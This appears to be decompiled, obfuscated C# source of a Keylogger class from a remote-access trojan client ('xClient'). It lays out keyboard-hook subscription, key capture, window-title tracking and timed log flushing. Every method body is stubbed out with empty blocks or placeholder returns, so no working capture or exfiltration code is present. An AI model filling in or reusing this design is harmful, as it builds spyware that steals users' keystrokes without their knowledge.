using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Text;
using System.Timers;
using System.Windows.Forms;
using dg3ypDAonQcOidMs0w;
using xClient.Core.MouseKeyHook;

namespace xClient.Core.Utilities;

public class Keylogger : IDisposable
{
	public static Keylogger Instance;

	private readonly Timer _timerFlush;

	private StringBuilder _logFileBuffer;

	private List<Keys> _pressedKeys;

	private List<char> _pressedKeyChars;

	private string _lastWindowTitle;

	private bool _ignoreSpecialKeys;

	private IKeyboardMouseEvents _mEvents;

	internal static Keylogger m0ICpoXJJdCLUZt0Snj;

	public bool IsDisposed
	{
		[CompilerGenerated]
		get
		{
			return true;
		}
		[CompilerGenerated]
		private set
		{
		}
	}

	public static string LogDirectory => null;

	public Keylogger(double flushInterval)
	{
	}

	public void Dispose()
	{
	}

	protected virtual void Dispose(bool disposing)
	{
	}

	private void Subscribe(IKeyboardMouseEvents events)
	{
	}

	private void Unsubscribe()
	{
	}

	private void OnKeyDown(object sender, KeyEventArgs e)
	{
	}

	private void OnKeyPress(object sender, KeyPressEventArgs e)
	{
	}

	private void OnKeyUp(object sender, KeyEventArgs e)
	{
	}

	private string HighlightSpecialKeys(Keys[] keys)
	{
		return null;
	}

	private void timerFlush_Elapsed(object sender, ElapsedEventArgs e)
	{
	}

	private void WriteFile()
	{
	}

	static Keylogger()
	{
		WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		gaoGbhXzLvvs0Jo2pND();
	}

	internal static bool wEv8J1XpHbL29Qbhtjf()
	{
		return true;
	}

	internal static Keylogger cAyGtmXmIpw3mEhfoLg()
	{
		return null;
	}

	internal static object aog8LIX8a9GjIUjLCGo(Environment.SpecialFolder specialFolder_0)
	{
		return null;
	}

	internal static void pQHZhfXr4T9flmVIOK1()
	{
	}

	internal static object FOW1QMXENZX73oCQy2V()
	{
		return null;
	}

	internal static void GSKolDXOjwWhiaSNhL1(object object_0, double double_0)
	{
	}

	internal static void XrjYn7XiqLjKcUo9DPk(object object_0, object object_1)
	{
	}

	internal static void bL6C1uX9wqymeirglRB(object object_0)
	{
	}

	internal static void znynJmX5FlUlDv9BA7C(object object_0)
	{
	}

	internal static void fMFd5YX4CJAKDkfWC5a(object object_0)
	{
	}

	internal static void lxfOY3Xh87y3qBEobBJ(object object_0, object object_1)
	{
	}

	internal static void nmPcCvXwR88TCrkwngU(object object_0, object object_1)
	{
	}

	internal static void RBYeEWXyAOs3rJawEAh(object object_0, object object_1)
	{
	}

	internal static void XJ7WEkXlKWp4OZFVnsF(object object_0, object object_1)
	{
	}

	internal static void TfQJKYXHcDL0GghLExI(object object_0, object object_1)
	{
	}

	internal static void ka2r75XVr96GpnihDa5(object object_0, object object_1)
	{
	}

	internal static void iDdvqbXMIE2TH1SPWdm(object object_0)
	{
	}

	internal static object UoigxgXt96uWlxf6w1w()
	{
		return null;
	}

	internal static bool hYwjOKXUlfqi63XPQOu(object object_0)
	{
		return true;
	}

	internal static bool uRXY1LXTLYqN9GuWeOu(object object_0, object object_1)
	{
		return true;
	}

	internal static object iuEZ1AXPuBLUQSK2Gap(int int_0)
	{
		return null;
	}

	internal static object WsuHAYXelXpAu0RWgXN(object object_0)
	{
		return null;
	}

	internal static DateTime f7B9DmX2oFqSHOZwal3()
	{
		return (DateTime)(object)null;
	}

	internal static object p780uxX0wNjJOi7qU2G(object object_0, object object_1)
	{
		return null;
	}

	internal static Keys alx32WXK23xMbc1X4BL(object object_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return (Keys)(object)null;
	}

	internal static bool SbADcJXBb4FIXE3eQ1p(Keys k)
	{
		return true;
	}

	internal static char EqR68kXNqg2PrQZNFTg(object object_0)
	{
		return '\0';
	}

	internal static object JQQH3vXZTOYoAIMOFyk(object object_0)
	{
		return null;
	}

	internal static void dwn01MXQlvDjy6xWHgD(object object_0)
	{
	}

	internal static object ATS7QvXj2ROWSwUJNmm(object object_0, object object_1, object object_2)
	{
		return null;
	}

	internal static bool i80lLmXsrIDdeYn5LwZ(object object_0, object object_1)
	{
		return true;
	}

	internal static int w7poknXdsYAC1mAiUwA(object object_0)
	{
		return 0;
	}

	internal static bool fwNxjUXAoXikGQUyYJw()
	{
		return true;
	}

	internal static object JpZoVaX3noTd3qgMMr4(object object_0, object object_1)
	{
		return null;
	}

	internal static object GTY52IX1nO8GRe1HsKo()
	{
		return null;
	}

	internal static bool J2elQZXq6xZDr5OuVdB(object object_0)
	{
		return true;
	}

	internal static void T6LNCOXbFV4sWfxie6i(object object_0)
	{
	}

	internal static object ihPHGAX70YKuyG2unDV(object object_0, object object_1, object object_2)
	{
		return null;
	}

	internal static object XM09BnXu6OPZoDqxjyf(object object_0)
	{
		return null;
	}

	internal static void gaoGbhXzLvvs0Jo2pND()
	{
	}
}
